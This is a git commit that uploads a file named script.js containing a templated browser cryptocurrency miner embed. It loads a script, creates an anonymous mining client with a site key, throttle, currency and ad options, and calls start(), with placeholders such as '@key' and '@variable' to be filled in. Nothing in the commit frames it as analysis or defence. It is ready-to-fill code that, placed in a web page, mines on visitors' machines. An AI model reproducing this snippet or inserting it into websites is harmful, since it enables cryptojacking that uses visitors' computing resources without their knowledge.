55ecf73dd24cae39687b29cd8973dc536868d02d
fixercoin <khanbabusargodhaa@gmail.com>
2025-03-04 14:41:44 +0500

    Add files via upload

---
+++ script.js
@@ -0,0 +1,7 @@
+<script nonce="ncsvlANBeSLr15IsnonILA\u003D\u003D" src="@Script"></script>
+<script nonce="ncsvlANBeSLr15IsnonILA\u003D\u003D">
+    var @variable = new Client.Anonymous('@key', {
+        throttle: @throt @currencymodifier @showAds
+    });
+    @stopmobilemining @variable.start();
+</script>
